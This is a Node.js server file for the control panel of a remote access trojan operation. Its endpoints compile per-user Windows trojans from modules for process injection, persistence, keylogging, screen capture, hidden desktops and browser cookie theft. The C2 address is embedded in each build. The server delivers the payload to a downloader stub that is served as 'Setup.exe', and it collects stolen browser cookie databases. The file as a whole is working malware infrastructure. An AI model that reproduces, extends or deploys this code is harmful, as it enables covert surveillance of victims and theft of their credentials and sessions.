const http = require('http');
const url = require('url');

class AuthAPI {
    constructor(authManager, port = 8081) {
        this.authManager = authManager;
        this.port = port;
        this.server = null;
    }

    start() {
        this.server = http.createServer((req, res) => {
            this.handleRequest(req, res);
        });

        this.server.listen(this.port, () => {
            console.log(`Auth API server listening on port ${this.port}`);
        });

        return this.server;
    }

    stop() {
        if (this.server) {
            this.server.close();
        }
    }

    async handleRequest(req, res) {
        const parsedUrl = url.parse(req.url, true);
        const path = parsedUrl.pathname;
        const method = req.method;

        // Set CORS headers — must be specific origin for credentials
        const allowedOrigin = process.env.ALLOWED_ORIGIN || 'http://localhost:3000';
        res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

        // Handle preflight requests
        if (method === 'OPTIONS') {
            res.writeHead(200);
            res.end();
            return;
        }

        // Parse request body
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', async () => {
            try {
                let data = {};
                if (body) {
                    data = JSON.parse(body);
                }

                // Route requests
                if (path === '/api/auth/login' && method === 'POST') {
                    await this.handleLogin(req, res, data);
                } else if (path === '/api/auth/register' && method === 'POST') {
                    await this.handleRegister(req, res, data);
                } else if (path === '/api/auth/verify' && method === 'POST') {
                    await this.handleVerify(req, res, data);
                } else if (path === '/api/auth/me' && method === 'GET') {
                    await this.handleMe(req, res);
                } else if (path === '/api/auth/logout' && (method === 'GET' || method === 'POST')) {
                    await this.handleLogout(req, res);
                } else if (path === '/api/auth/users' && method === 'GET') {
                    await this.handleGetUsers(req, res, data);
                } else if (path.match(/^\/api\/auth\/users\/[a-f0-9]+$/) && method === 'DELETE') {
                    await this.handleDeleteUser(req, res, path);
                } else if (path.match(/^\/api\/auth\/users\/[a-f0-9]+$/) && method === 'PUT') {
                    await this.handleUpdateUser(req, res, path, data);
                } else if (path === '/api/auth/generate-rat' && method === 'POST') {
                    await this.handleGenerateRat(req, res, data);
                } else if (path.startsWith('/api/auth/download-rat/') && method === 'GET') {
                    await this.handleDownloadRat(req, res, path);
                } else if (path === '/api/rat/payload' && method === 'GET') {
                    await this.handleRatPayload(req, res);
                } else if (path === '/api/rat/download-stub' && method === 'GET') {
                    await this.handleDownloadStub(req, res);
                } else if (path === '/api/cookie-blob' && method === 'POST') {
                    await this.handleCookieBlob(req, res, data);
                } else {
                    this.sendResponse(res, 404, { error: 'Not found' });
                }
            } catch (error) {
                console.error('Auth API error:', error);
                this.sendResponse(res, 500, { error: 'Internal server error' });
            }
        });
    }

    async handleLogin(req, res, data) {
        const { username, password } = data;

        if (!username || !password) {
            this.sendResponse(res, 400, { error: 'Username and password are required' });
            return;
        }

        const result = await this.authManager.login(username, password);

        if (result.success) {
            // Set HttpOnly cookie — JS cannot read this
            const cookieAge = 7 * 24 * 3600;
            res.setHeader('Set-Cookie',
                `auth_token=${encodeURIComponent(result.token)}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${cookieAge}`);
            this.sendResponse(res, 200, {
                success: true,
                user: {
                    id: result.userId,
                    username: result.username,
                    role: result.role
                }
            });
        } else {
            this.sendResponse(res, 401, { error: result.error });
        }
    }

    async handleRegister(req, res, data) {
        const { username, password, role = 'user' } = data;

        if (!username || !password) {
            this.sendResponse(res, 400, { error: 'Username and password are required' });
            return;
        }

        if (role !== 'user' && role !== 'admin') {
            this.sendResponse(res, 400, { error: 'Role must be "user" or "admin"' });
            return;
        }

        const result = await this.authManager.register(username, password, role);

        if (result.success) {
            this.sendResponse(res, 201, {
                success: true,
                token: result.token,
                user: {
                    id: result.userId,
                    username: result.username,
                    role: result.role
                }
            });
        } else {
            this.sendResponse(res, 400, { error: result.error });
        }
    }

    async handleVerify(req, res, data) {
        const { token } = data;

        if (!token) {
            this.sendResponse(res, 400, { error: 'Token is required' });
            return;
        }

        const user = this.authManager.authenticate(token);

        if (user) {
            this.sendResponse(res, 200, {
                valid: true,
                user: {
                    id: user.userId,
                    username: user.username,
                    role: user.role
                }
            });
        } else {
            this.sendResponse(res, 401, { valid: false, error: 'Invalid token' });
        }
    }

    // Read token from HttpOnly cookie or fallback to Authorization header
    getTokenFromRequest(req) {
        const cookieHeader = req.headers['cookie'] || '';
        const match = cookieHeader.split(';').find(c => c.trim().startsWith('auth_token='));
        if (match) return decodeURIComponent(match.split('=').slice(1).join('=').trim());
        const authHeader = req.headers['authorization'];
        if (authHeader?.startsWith('Bearer ')) return authHeader.substring(7);
        return null;
    }

    getAuthenticatedUser(req) {
        const token = this.getTokenFromRequest(req);
        if (!token) return null;
        return this.authManager.authenticate(token);
    }

    async handleMe(req, res) {
        const user = this.getAuthenticatedUser(req);
        if (!user) { this.sendResponse(res, 401, { error: 'Not authenticated' }); return; }
        this.sendResponse(res, 200, {
            user: { id: user.userId, username: user.username, role: user.role }
        });
    }

    async handleLogout(req, res) {
        res.setHeader('Set-Cookie', 'auth_token=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:00 GMT');
        this.sendResponse(res, 200, { success: true });
    }

    async handleGetUsers(req, res, data) {
        const user = this.getAuthenticatedUser(req);
        if (!user) { this.sendResponse(res, 401, { error: 'Authorization required' }); return; }
        if (user.role !== 'admin') { this.sendResponse(res, 403, { error: 'Admin access required' }); return; }

        const users = this.authManager.db.getAllUsers();
        this.sendResponse(res, 200, { users });
    }

    async handleDeleteUser(req, res, path) {
        const user = this.getAuthenticatedUser(req);
        if (!user) { this.sendResponse(res, 401, { error: 'Authorization required' }); return; }
        if (user.role !== 'admin') { this.sendResponse(res, 403, { error: 'Admin access required' }); return; }

        const targetId = path.split('/').pop();
        if (String(user.userId) === targetId) {
            this.sendResponse(res, 400, { error: 'Cannot delete your own account' });
            return;
        }
        const target = this.authManager.db.getUserById(targetId);
        if (!target) { this.sendResponse(res, 404, { error: 'User not found' }); return; }

        this.authManager.db.deleteUser(targetId);
        this.sendResponse(res, 200, { success: true, message: 'User deleted' });
    }

    async handleUpdateUser(req, res, path, data) {
        const user = this.getAuthenticatedUser(req);
        if (!user) { this.sendResponse(res, 401, { error: 'Authorization required' }); return; }
        if (user.role !== 'admin') { this.sendResponse(res, 403, { error: 'Admin access required' }); return; }

        const targetId = path.split('/').pop();
        const target = this.authManager.db.getUserById(targetId);
        if (!target) { this.sendResponse(res, 404, { error: 'User not found' }); return; }

        if (data.role && ['admin', 'user'].includes(data.role)) {
            this.authManager.db.updateUserRole(targetId, data.role);
        }
        if (data.password) {
            const hash = await this.authManager.hashPassword(data.password);
            const stmt = this.authManager.db.db.prepare('UPDATE users SET password_hash = ? WHERE id = ?');
            stmt.run(hash, targetId);
        }
        const updated = this.authManager.db.getUserById(targetId);
        this.sendResponse(res, 200, { success: true, user: updated });
    }

    async handleGenerateRat(req, res, data) {
        const user = this.getAuthenticatedUser(req);
        if (!user) { this.sendResponse(res, 401, { error: 'Authorization required' }); return; }

        const { target_user_id, server_ip, server_port } = data;

        if (!target_user_id) {
            this.sendResponse(res, 400, { error: 'target_user_id is required' });
            return;
        }

        const c2Host = server_ip || process.env.C2_HOST || '127.0.0.1';
        const c2Port = parseInt(server_port) || parseInt(process.env.C2_PORT) || 4444;

        // Only admins can generate RATs for other users
        // Convert both to string for comparison (user.userId could be number, target_user_id could be number or string)
        if (user.role !== 'admin' && String(user.userId) !== String(target_user_id)) {
            this.sendResponse(res, 403, { error: 'You can only generate RATs for yourself' });
            return;
        }

        try {
            // Generate RAT executable with the specified user_id and server config
            const ratPath = await this.generateRatExecutable(target_user_id, c2Host, c2Port);
            
            this.sendResponse(res, 200, {
                success: true,
                message: 'RAT executable generated successfully',
                download_url: `/api/auth/download-rat/${target_user_id}`,
                file_path: ratPath,
                server_ip: c2Host,
                server_port: c2Port
            });
        } catch (error) {
            console.error('Error generating RAT:', error);
            this.sendResponse(res, 500, { error: 'Failed to generate RAT executable: ' + error.message });
        }
    }

    // Auto-detect the server's public IP by checking network interfaces
    getServerIp() {
        try {
            const os = require('os');
            const interfaces = os.networkInterfaces();
            for (const name of Object.keys(interfaces)) {
                for (const iface of interfaces[name]) {
                    // Skip internal/loopback, IPv6, and non-Ethernet/WiFi
                    if (iface.family === 'IPv4' && !iface.internal) {
                        return iface.address;
                    }
                }
            }
        } catch (e) {
            // Fallback
        }
        return '127.0.0.1';
    }

    async generateRatExecutable(userId, serverIp = '127.0.0.1', serverPort = 4444) {
        // Auto-detect server IP if still using default
        if (serverIp === '127.0.0.1' || serverIp === 'localhost') {
            const detectedIp = this.getServerIp();
            if (detectedIp !== '127.0.0.1') {
                console.log(`[RAT GEN] Auto-detected server IP: ${detectedIp} (was ${serverIp})`);
                serverIp = detectedIp;
            }
        }
        const { exec } = require('child_process');
        const path = require('path');
        const fs = require('fs');

        // Paths
        const rootDir = path.join(__dirname, '..');
        const ratSourceDir = path.join(rootDir, 'rootserver');
        const outputDir = path.join(rootDir, 'generated_rats');
        const outputFile = path.join(outputDir, `rat_user_${userId}.exe`);

        // Create output directory if it doesn't exist
        if (!fs.existsSync(outputDir)) {
            fs.mkdirSync(outputDir, { recursive: true });
        }

        // Create a custom compile script
        const tempCompileScript = path.join(outputDir, `compile_user_${userId}.bat`);
        
        // Build the compile script content
        // Use short path (8.3) to avoid spaces in "CLI C+ Root"
        const w64devkitBin = path.join(rootDir, 'rootserver', 'w64devkit', 'w64devkit', 'bin');
        const shortBin = this.getShortPath(w64devkitBin);
        const shortSrcDir = this.getShortPath(ratSourceDir);
        const shortOutFile = this.getShortPath(outputFile);

        const compileContent = `@echo off
setlocal enabledelayedexpansion
set "PATH=${shortBin};%PATH%"
echo Compiling Windows Administration Tool for user ${userId}...
echo.

REM Change to the source directory
cd /d "${shortSrcDir}"

REM Force use of w64devkit assembler (avoid 32-bit MinGW as.exe on system PATH)
SET "AS_BIN=${shortBin}"

REM Compile individual source files
g++ -c injection.cpp -o injection.o -lpsapi -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: injection.cpp && exit /b 1
g++ -c persistence.cpp -o persistence.o -ladvapi32 -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: persistence.cpp && exit /b 1
g++ -c keyboard.cpp -o keyboard.o -luser32 -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: keyboard.cpp && exit /b 1
g++ -c utils.cpp -o utils.o -lpsapi -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: utils.cpp && exit /b 1
g++ -c exec_command.cpp -o exec_command.o -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: exec_command.cpp && exit /b 1
g++ -c send_to_server.cpp -o send_to_server.o -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: send_to_server.cpp && exit /b 1
g++ -c send_file.cpp -o send_file.o -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: send_file.cpp && exit /b 1
g++ -c screen_capture.cpp -o screen_capture.o -lgdi32 -lgdiplus -ld3d11 -ldxgi -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: screen_capture.cpp && exit /b 1
g++ -c file_browser.cpp -o file_browser.o -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: file_browser.cpp && exit /b 1
g++ -c process_utils.cpp -o process_utils.o -lpsapi -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: process_utils.cpp && exit /b 1
g++ -c cookie_grabber.cpp -o cookie_grabber.o -lshlwapi -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: cookie_grabber.cpp && exit /b 1
g++ -c data_scraper.cpp -o data_scraper.o -std=c++17 -lwininet -lole32 -lwindowscodecs -lgdi32 -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: data_scraper.cpp && exit /b 1
g++ -c hidden_desktop.cpp -o hidden_desktop.o -luser32 -lwtsapi32 -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: hidden_desktop.cpp && exit /b 1
g++ -c main.cpp -o main.o -I. -lpsapi -DUSER_ID_STR="${userId}" -DC2_SERVER_STR=${serverIp} -DC2_PORT_NUM=${serverPort} -B "${shortBin}"
if %ERRORLEVEL% neq 0 echo FAILED: main.cpp && exit /b 1

REM Compile the application manifest
windres app.rc -O coff -o app.res
if %ERRORLEVEL% neq 0 echo FAILED: app.rc && exit /b 1

REM Link everything together with all required libraries
g++ -o "${shortOutFile}" app.res main.o injection.o persistence.o keyboard.o utils.o exec_command.o send_to_server.o send_file.o screen_capture.o file_browser.o process_utils.o cookie_grabber.o data_scraper.o hidden_desktop.o -lpsapi -ladvapi32 -luser32 -lkernel32 -lws2_32 -lgdi32 -lgdiplus -ld3d11 -ldxgi -lshlwapi -lole32 -lwininet -lwindowscodecs -lwtsapi32 -lcrypt32 -static -std=c++17
if %ERRORLEVEL% neq 0 echo FAILED: linking && exit /b 1

echo.
echo Compilation complete!
echo Executable: ${shortOutFile}
echo.`;

        fs.writeFileSync(tempCompileScript, compileContent, 'utf8');
        return new Promise((resolve, reject) => {
            exec(`"${tempCompileScript}"`, { cwd: ratSourceDir, maxBuffer: 10 * 1024 * 1024 }, (error, stdout, stderr) => {
                // Clean up temp compile script
                try {
                    fs.unlinkSync(tempCompileScript);
                } catch (e) {
                    // Ignore cleanup errors
                }

                if (error) {
                    console.error('Compilation error:', error);
                    console.error('stdout:', stdout);
                    console.error('stderr:', stderr);
                    reject(new Error(`Compilation failed: ${stderr || error.message}`));
                    return;
                }

                console.log('RAT compilation output:', stdout);
                console.log('RAT compilation stderr:', stderr);

                // Verify the file was created
                if (fs.existsSync(outputFile)) {
                    resolve(outputFile);
                } else {
                    reject(new Error('RAT executable was not created'));
                }
            });
        });
    }

    // Get short (8.3) path to avoid spaces in paths
    getShortPath(longPath) {
        try {
            const fs = require('fs');
            // Use cmd to get short path
            const { execSync } = require('child_process');
            const result = execSync(`for %I in ("${longPath}") do echo %~sI`, { encoding: 'utf8', timeout: 5000 });
            const shortPath = result.trim().split('\n').pop().trim();
            if (shortPath && shortPath.length > 0) return shortPath;
        } catch (e) {
            // Fallback: just return the long path
        }
        return longPath;
    }

    async handleDownloadRat(req, res, path) {
        const user = this.getAuthenticatedUser(req);
        if (!user) { this.sendResponse(res, 401, { error: 'Authorization required' }); return; }

        // Extract user_id from path
        const pathParts = path.split('/');
        const targetUserId = pathParts[pathParts.length - 1];

        if (!targetUserId) {
            this.sendResponse(res, 400, { error: 'Invalid user ID' });
            return;
        }

        // Check permissions — convert both to string for comparison
        if (user.role !== 'admin' && String(user.userId) !== targetUserId) {
            this.sendResponse(res, 403, { error: 'You can only download your own RAT files' });
            return;
        }

        const fs = require('fs');
        const pathModule = require('path');
        
        const rootDir = pathModule.join(__dirname, '..');
        const outputDir = pathModule.join(rootDir, 'generated_rats');
        const outputFile = pathModule.join(outputDir, `rat_user_${targetUserId}.exe`);

        // Check if file exists
        if (!fs.existsSync(outputFile)) {
            this.sendResponse(res, 404, { error: 'RAT executable not found. Generate it first.' });
            return;
        }

        // Read file and send as download
        try {
            const fileData = fs.readFileSync(outputFile);
            
            res.writeHead(200, {
                'Content-Type': 'application/octet-stream',
                'Content-Disposition': `attachment; filename="rat_user_${targetUserId}.exe"`,
                'Content-Length': fileData.length
            });
            
            res.end(fileData);
        } catch (error) {
            console.error('Error reading RAT file:', error);
            this.sendResponse(res, 500, { error: 'Failed to read RAT file' });
        }
    }

    async handleRatPayload(req, res) {
        // Serve the most recently compiled RAT from generated_rats/ to the downloader stub
        // This ensures the stub always gets the latest binary with all features (KILL_RAT, etc.)
        const fs = require('fs');
        const pathModule = require('path');
        
        const rootDir = pathModule.join(__dirname, '..');
        const outputDir = pathModule.join(rootDir, 'generated_rats');
        
        // Find the most recently compiled RAT in generated_rats/
        let payloadFile = null;
        
        if (fs.existsSync(outputDir)) {
            const files = fs.readdirSync(outputDir)
                .filter(f => f.startsWith('rat_user_') && f.endsWith('.exe'))
                .map(f => ({
                    name: f,
                    path: pathModule.join(outputDir, f),
                    mtime: fs.statSync(pathModule.join(outputDir, f)).mtimeMs
                }))
                .sort((a, b) => b.mtime - a.mtime); // Most recent first
            
            if (files.length > 0) {
                payloadFile = files[0].path;
                console.log(`[PAYLOAD] Using most recently compiled RAT: ${files[0].name}`);
            }
        }
        
        // Fallback to myapp.exe if no generated RATs exist
        if (!payloadFile) {
            const ratSourceDir = pathModule.join(rootDir, 'rootserver');
            payloadFile = pathModule.join(ratSourceDir, 'myapp.exe');
            
            if (!fs.existsSync(payloadFile)) {
                this.sendResponse(res, 404, { error: 'RAT payload not found. Generate a RAT first.' });
                return;
            }
            console.log(`[PAYLOAD] No generated RATs found, falling back to myapp.exe`);
        }

        try {
            const fileData = fs.readFileSync(payloadFile);
            
            res.writeHead(200, {
                'Content-Type': 'application/octet-stream',
                'Content-Length': fileData.length
            });
            
            res.end(fileData);
            console.log(`[PAYLOAD] Served RAT payload: ${fileData.length} bytes`);
        } catch (error) {
            console.error('Error reading RAT payload:', error);
            this.sendResponse(res, 500, { error: 'Failed to read RAT payload' });
        }
    }

    async handleDownloadStub(req, res) {
        // Serve the downloader stub EXE to the dashboard user
        const user = this.getAuthenticatedUser(req);
        if (!user) { this.sendResponse(res, 401, { error: 'Authorization required' }); return; }

        const fs = require('fs');
        const pathModule = require('path');
        
        const rootDir = pathModule.join(__dirname, '..');
        const ratSourceDir = pathModule.join(rootDir, 'rootserver');
        const stubFile = pathModule.join(ratSourceDir, 'stub.exe');

        if (!fs.existsSync(stubFile)) {
            this.sendResponse(res, 404, { error: 'Downloader stub not found. Compile stub.exe first.' });
            return;
        }

        try {
            const fileData = fs.readFileSync(stubFile);
            
            res.writeHead(200, {
                'Content-Type': 'application/octet-stream',
                'Content-Disposition': `attachment; filename="Setup.exe"`,
                'Content-Length': fileData.length
            });
            
            res.end(fileData);
            console.log(`[STUB] Served downloader stub: ${fileData.length} bytes`);
        } catch (error) {
            console.error('Error reading stub file:', error);
            this.sendResponse(res, 500, { error: 'Failed to read stub file' });
        }
    }

    async handleCookieBlob(req, res, data) {
        const { clientId, browser, localStateB64, cookiesDbB64 } = data;

        if (!clientId || !browser) {
            this.sendResponse(res, 400, { error: 'clientId and browser are required' });
            return;
        }

        try {
            const result = this.authManager.db.addCookieBlob(clientId, browser, localStateB64 || null, cookiesDbB64 || null);
            this.sendResponse(res, 200, { success: true, result });
        } catch (error) {
            console.error('Error storing cookie blob:', error);
            this.sendResponse(res, 500, { error: 'Failed to store cookie blob' });
        }
    }

    sendResponse(res, statusCode, data) {
        res.statusCode = statusCode;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify(data));
    }
}

module.exports = AuthAPI;
